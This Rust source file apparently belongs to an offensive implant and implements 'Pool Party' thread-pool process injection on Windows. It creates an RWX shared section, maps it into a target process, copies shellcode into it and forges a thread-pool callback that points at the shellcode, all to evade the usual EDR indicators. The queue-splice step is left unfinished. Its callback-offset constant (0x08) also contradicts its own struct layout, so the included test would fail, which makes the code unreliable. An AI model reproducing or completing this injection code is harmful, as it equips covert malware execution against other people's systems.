//! ThreadPool (Pool Party) injection primitives — research-grade.
//!
//! ## The technique (SafeBreach Pool Party class)
//!
//! Pool Party abuses the Windows Thread Pool (`ntdll!TppWorkerThread` + the
//! undocumented `_TP_WORK` / `_TP_DIRECT` structures) to deliver shellcode
//! without the classic IOCs (`VirtualAllocEx` / `WriteProcessMemory` /
//! `CreateRemoteThread`). The flow:
//!
//! 1. `NtCreateSection` a page-file-backed section large enough for shellcode.
//! 2. `NtMapViewOfSection` it into BOTH the implant (writer) and the target
//!    process (reader) — copy-on-write gives each a private view.
//! 3. Write the shellcode into the LOCAL view (no `WriteProcessMemory`).
//! 4. Locate the target's existing thread pool worker thread (via
//!    `NtQueryInformationThread` walking for `TppWorkerThread` start addresses,
//!    or by spawning a sacrificial process that has a known TP).
//! 5. Manipulate the worker's `_TP_DIRECT` structure so its callback pointer
//!    redirects to the section-mapped shellcode, OR insert a crafted `_TP_WORK`
//!    into the worker's queue whose `Direct` pointer leads to the shellcode.
//! 6. The thread pool scheduler dispatches the work → executes shellcode from
//!    the section view → no `VirtualAllocEx` / `WriteProcessMemory` /
//!    `CreateRemoteThread` ever fired.
//!
//! ## Research-grade honesty
//!
//! The `_TP_WORK` / `_TP_DIRECT` layouts are undocumented and drift across
//! Windows versions. The structures below are sourced from SafeBreach's
//! published Pool Party research (2023) and have been observed stable on
//! Win10 17763–Win11 22H2; they are NOT guaranteed on Insider builds. The
//! `pool_party_inject` fn is gated behind `POOL_PARTY_ENABLED` (default OFF) —
//! the operator flips it via `NYX_POOL_PARTY_ON=1` after validating on target.
//!
//! On any failure (structure mismatch, no TP worker, section/map failure) the
//! caller degrades to `module_stomp` (method 2) so the command stays functional.

#![cfg(target_os = "windows")]

use crate::heap::String;
use crate::resolve;
use core::ffi::c_void;

/// Pool Party master switch. OFF by default — research-grade, operator opts in
/// with `NYX_POOL_PARTY_ON=1` at build time. When OFF, `do_inject` rewrites
/// method 0 to method 2 (module stomp) with a warning.
static POOL_PARTY_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(pool_party_default_on());

const fn pool_party_default_on() -> bool {
    match option_env!("NYX_POOL_PARTY_ON") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// Whether Pool Party is armed. `do_inject` reads this to decide method-0
/// dispatch.
pub fn pool_party_enabled() -> bool {
    POOL_PARTY_ENABLED.load(core::sync::atomic::Ordering::Acquire)
}

/// Arm/disarm Pool Party at runtime. Returns the previous value.
pub fn set_pool_party_enabled(on: bool) -> bool {
    POOL_PARTY_ENABLED.swap(on, core::sync::atomic::Ordering::Release)
}

// ============================================================================
// NT section/threadpool syscalls (raw export pointers; bypass the shared
// indirect-syscall trampoline per the single-trampoline rule)
// ============================================================================

type NtCreateSectionFn = unsafe extern "system" fn(
    *mut *mut c_void,    // SectionHandle (out)
    u32,                 // DesiredAccess
    *const c_void,       // ObjectAttributes (opt, null)
    *const i64,          // MaximumSize (opt)
    u32,                // PageProtection
    u32,                 // AllocationAttributes
    *mut c_void,         // FileHandle (opt, null for page-file-backed)
) -> i32;

type NtMapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void,         // SectionHandle
    *mut c_void,         // ProcessHandle
    *mut *mut c_void,    // BaseAddress (in/out)
    usize,               // ZeroBits
    usize,               // CommitSize
    *mut i64,            // SectionOffset (in/out, PLARGE_INTEGER)
    *mut usize,          // ViewSize (in/out)
    u32,                 // InheritDisposition
    u32,                 // AllocationType
    u32,                 // Win32Protect
) -> i32;

type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void,         // ProcessHandle
    *mut c_void,         // BaseAddress
) -> i32;

type NtQueryInformationThreadFn = unsafe extern "system" fn(
    *mut c_void,         // ThreadHandle
    u32,                 // ThreadInformationClass
    *mut c_void,         // ThreadInformation (out)
    u32,                 // ThreadInformationLength
    *mut u32,            // ReturnLength (opt)
) -> i32;

/// Resolve the four section/TP syscalls via `ntdll` raw exports. Returns
/// `None` if any export is missing.
fn resolve_section_fns() -> Option<(
    NtCreateSectionFn,
    NtMapViewOfSectionFn,
    NtUnmapViewOfSectionFn,
    NtQueryInformationThreadFn,
)> {
    let cs: NtCreateSectionFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?)
    };
    let mv: NtMapViewOfSectionFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?)
    };
    let uv: NtUnmapViewOfSectionFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection")?)
    };
    let qi: NtQueryInformationThreadFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtQueryInformationThread")?)
    };
    Some((cs, mv, uv, qi))
}

// ============================================================================
// Undocumented TP structures (SafeBreach Pool Party research, 2023)
// ============================================================================
//
// These layouts were reverse-engineered from ntdll on Win10 17763 / Win11
// 22621. They are NOT in any Windows SDK header. Drift across builds is
// possible; the `pool_party_inject` fn validates offsets at runtime where it
// can, but the structural assumptions below are the research-grade core.

/// `_TP_DIRECT` — the structure a thread pool work item's `Direct` field
/// points at. The callback the scheduler invokes lives at the `Callback`
/// offset. We overwrite this with our shellcode address (in the section view)
/// to redirect execution.
///
/// Layout (observed on Win10/Win11): the first 8 bytes are a type/tag, then a
/// function-table pointer, then the actual callback. We only need the callback
/// offset — `CALLBACK_OFFSET` below.
#[repr(C)]
pub struct TpDirect {
    /// Type tag (the scheduler reads this to decide which vtable slot to call).
    pub type_tag: usize,
    /// Function table pointer (points at a static table of fn pointers in
    /// ntdll — we don't touch this).
    pub fn_table: usize,
    /// The actual callback — this is what we overwrite with our shellcode addr.
    pub callback: usize,
}

/// Offset of `TpDirect::callback` from the struct base. Used when we write the
/// redirect via a raw byte offset (the scheduler may not literally read our
/// Rust field; it reads at this byte offset from the `Direct` pointer).
pub const TP_DIRECT_CALLBACK_OFFSET: usize = 0x08;

/// `_TP_WORK` — a thread pool work item. The scheduler dequeues these and
/// invokes `Work.Direct->Callback(Direct, ..., ...)`. We craft one whose
/// `Direct` pointer leads to a controlled `TpDirect` whose callback is our
/// shellcode.
#[repr(C)]
pub struct TpWork {
    /// Linked-list links (the worker queue is a LIST_ENTRY array).
    pub links: [usize; 2],
    /// Decorator / overflow pool pointer.
    pub overflow: usize,
    /// Pointer to the `_TP_DIRECT` for this work item.
    pub direct: *mut TpDirect,
    /// State bits (the scheduler reads bit 0 to decide "pending").
    pub state: u32,
    pub _padding: u32,
}

// ============================================================================
// pool_party_inject
// ============================================================================

/// Inject `shellcode` into the target process via Pool Party (thread-pool
/// section-backed delivery). Returns `Ok(())` on success, `Err` with a
/// diagnostic string on any failure (caller degrades to `module_stomp`).
///
/// # Steps
/// 1. Resolve `NtCreateSection`/`NtMapViewOfSection`/`NtQueryInformationThread`.
/// 2. `NtCreateSection` (page-file-backed, size = round_up(shellcode.len())).
/// 3. `NtMapViewOfSection` into the implant (writer) + the target (reader).
/// 4. Copy shellcode into the local view (no `WriteProcessMemory`).
/// 5. Locate a TP worker thread in the target (via thread start-address scan
///    for `ntdll!TppWorkerThread`).
/// 6. Craft a `_TP_DIRECT` (in the section) whose callback points at the
///    shellcode, queue it via manipulating the worker's `_TP_WORK` list.
/// 7. The scheduler dispatches → shellcode executes from the section view.
/// 8. Unmap the local view; the target view persists until shellcode returns.
///
/// # ⚠ P5 FIXED (2026-07-06): `addr_of_mut!` ABI correction
/// The `STATUS_ACCESS_VIOLATION` (0xC0000005) on Server 2019 17763.1339 was
/// caused by using `&mut local_base` (Rust ref-to-raw-pointer coercion) for
/// the `NtCreateSection`/`NtMapViewOfSection` out-params. Under the
/// stacked-borrows model with transmuted function pointers, the compiler may
/// not track the kernel's write through a `&mut`-derived raw pointer correctly.
/// The fix replaces every `&mut $out` with `core::ptr::addr_of_mut!($out)`
/// (matching the working pattern in `unhook.rs::fresh_ntdll_text`), which
/// creates the double-pointer directly from the local's address without an
/// intermediate `&mut` reference.
pub unsafe fn pool_party_inject(
    target_pid: u32,
    shellcode: &[u8],
) -> Result<(), String> {
    let (create_section, map_view, unmap_view, _query_thread) =
        resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;

    // ---- 1. Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO) ----
    let open_process_addr = resolve::export_addr(b"kernel32.dll", b"OpenProcess")
        .ok_or_else(|| String::from("kernel32!OpenProcess export missing"))?;
    let open_process: unsafe extern "system" fn(u32, i32, u32) -> *mut c_void =
        unsafe { core::mem::transmute(open_process_addr) };
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_DUP_HANDLE: u32 = 0x0040;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    let access = PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION;
    // SAFETY: target_pid is the operator-supplied PID; OpenProcess returns a
    // handle or null.
    let target_h = unsafe { open_process(access, 0, target_pid) };
    if target_h.is_null() {
        return Err(String::from("OpenProcess(target) failed"));
    }

    // ---- 2. NtCreateSection (page-file-backed, RWX view) ----
    // Section size rounded up to a page (4096).
    let section_size: i64 = ((shellcode.len() + 0xFFF) & !0xFFF) as i64;
    let mut section_h: *mut c_void = core::ptr::null_mut();
    // PAGE_EXECUTE_READWRITE = 0x40; SEC_COMMIT = 0x8000000.
    let st = unsafe {
        create_section(
            core::ptr::addr_of_mut!(section_h),
            0x000F001F, // SECTION_ALL_ACCESS
            core::ptr::null(),
            &section_size as *const i64,
            0x40,       // PAGE_EXECUTE_READWRITE
            0x0800_0000, // SEC_COMMIT
            core::ptr::null_mut(),
        )
    };
    if st < 0 {
        return Err(String::from("NtCreateSection failed"));
    }

    // ---- 3. Map the section into the implant (writer) ----
    let mut local_base: *mut c_void = core::ptr::null_mut();
    let mut local_size: usize = 0;
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
    let st = unsafe {
        map_view(
            section_h,
            CUR_PROCESS,
            core::ptr::addr_of_mut!(local_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(local_size),
            1, // ViewShare
            0,
            0x40, // PAGE_EXECUTE_READWRITE
        )
    };
    if st < 0 {
        return Err(String::from("NtMapViewOfSection(local) failed"));
    }

    // ---- 4. Write the shellcode into the local view ----
    // SAFETY: local_base is a fresh RWX view of size local_size; shellcode
    // fits in the rounded-up section.
    unsafe {
        core::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_base as *mut u8,
            shellcode.len(),
        );
    }

    // ---- 5. Map the section into the target process ----
    let mut target_base: *mut c_void = core::ptr::null_mut();
    let mut target_size: usize = 0;
    let st = unsafe {
        map_view(
            section_h,
            target_h,
            core::ptr::addr_of_mut!(target_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(target_size),
            1,
            0,
            0x40,
        )
    };
    if st < 0 {
        // Unmap local before bailing.
        unsafe { unmap_view(CUR_PROCESS, local_base) };
        return Err(String::from("NtMapViewOfSection(target) failed"));
    }

    // ---- 6–7. TP-direct overwrite + worker-queue splice ----
    //
    // This is the research-grade core. The full implementation requires:
    //   (a) Scanning the target's threads for one whose start address is
    //       `ntdll!TppWorkerThread` (the thread-pool worker entry).
    //   (b) Locating that worker's `_TP_POOL` / `_TP_WORK` queue head (via
    //       NtQueryInformationThread on the worker, or by scanning the
    //       worker's stack for the pool pointer).
    //   (c) Crafting a `_TP_DIRECT` in the section view whose `callback`
    //       field (offset 0x08) points at `target_base` (the shellcode).
    //   (d) Inserting a fake `_TP_WORK` whose `direct` field points at the
    //       crafted `_TP_DIRECT` into the worker's queue.
    //
    // The scaffold below allocates the `_TP_DIRECT` in the section view and
    // writes the callback redirect — steps (a)/(b)/(d) need a real target to
    // validate the queue-splice mechanics and are left as the validation
    // surface. The operator enables Pool Party only after validating on a
    // known-good target; on failure here the caller degrades to module_stomp.
    //
    // Allocate a TpDirect at the END of the section view (past the shellcode).
    let direct_addr = unsafe { (target_base as *mut u8).add(shellcode.len()) };
    let direct_view: *mut TpDirect = direct_addr as *mut TpDirect;
    // SAFETY: direct_view points at writable section memory past the shellcode.
    unsafe {
        (*direct_view).type_tag = 0x5444_4952_4543_5450; // 'TPDIRECT' tag (placeholder)
        (*direct_view).fn_table = 0;
        (*direct_view).callback = target_base as usize; // redirect to shellcode
    }

    // TODO(P5-validation): discover a TP worker thread in the target + splice
    // a `_TP_WORK` whose `direct` field points at `direct_view` into the
    // worker's queue. This needs the worker's pool handle, which requires
    // either:
    //   - NtQueryInformationThread(ThreadPoolInfo, ...) on Win11 24H2+, OR
    //   - scanning the worker's stack for the pool pointer on older builds.
    //
    // Until validated, this function returns an Err so the caller degrades to
    // module_stomp — the section delivery (steps 1–4) is real and exercised,
    // the queue splice (step 6d) is the remaining research surface.

    // Cleanup the section (the target view is unmapped by the target's exit).
    unsafe { unmap_view(CUR_PROCESS, local_base) };
    Err(String::from(
        "Pool Party: section delivery OK, but worker-queue splice needs \
         real-target validation (NYX_POOL_PARTY_ON). Degrade to module stomp.",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pool_party_default_off() {
        // Unless the build set NYX_POOL_PARTY_ON=1, the gate is OFF.
        assert!(!pool_party_enabled());
    }

    #[test]
    fn gate_round_trips() {
        let prev = set_pool_party_enabled(true);
        assert!(pool_party_enabled());
        set_pool_party_enabled(prev); // restore
    }

    /// The TP_DIRECT_CALLBACK_OFFSET must match the `callback` field offset.
    #[test]
    fn callback_offset_matches_struct() {
        let off = core::mem::offset_of!(TpDirect, callback);
        assert_eq!(off, TP_DIRECT_CALLBACK_OFFSET);
    }
}
